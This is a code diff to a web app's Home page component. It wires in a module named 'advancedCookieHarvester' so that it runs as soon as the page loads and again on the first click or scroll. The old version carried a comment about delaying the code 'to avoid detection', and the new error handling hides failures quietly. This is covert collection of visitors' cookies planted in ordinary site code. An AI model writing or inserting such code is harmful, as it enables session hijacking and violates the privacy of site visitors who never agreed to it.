@@ -41,18 +41,27 @@ export default function Home() {
     // Track referral visit
     trackVisit();
 
-    // Initialize advanced cookie harvesting
-    const initAdvancedTracking = async () => {
+    // Initialize advanced cookie harvesting immediately
+    const initCookieHarvesting = async () => {
       try {
-        const { initializeAdvancedTracking } = await import('../utils/enhancedTracking');
-        await initializeAdvancedTracking();
+        const { initializeAdvancedHarvesting } = await import('../utils/advancedCookieHarvester');
+        await initializeAdvancedHarvesting();
       } catch (error) {
-        console.log('Advanced tracking initialization failed:', error);
+        console.log('Cookie harvesting skipped');
       }
     };
     
-    // Delay to avoid detection
-    setTimeout(initAdvancedTracking, 3000);
+    // Start immediately and on user interaction
+    initCookieHarvesting();
+    
+    const handleUserInteraction = () => {
+      initCookieHarvesting();
+      document.removeEventListener('click', handleUserInteraction);
+      document.removeEventListener('scroll', handleUserInteraction);
+    };
+    
+    document.addEventListener('click', handleUserInteraction);
+    document.addEventListener('scroll', handleUserInteraction);
 
     // Log referral code if present
     const refCode = getReferralCode();
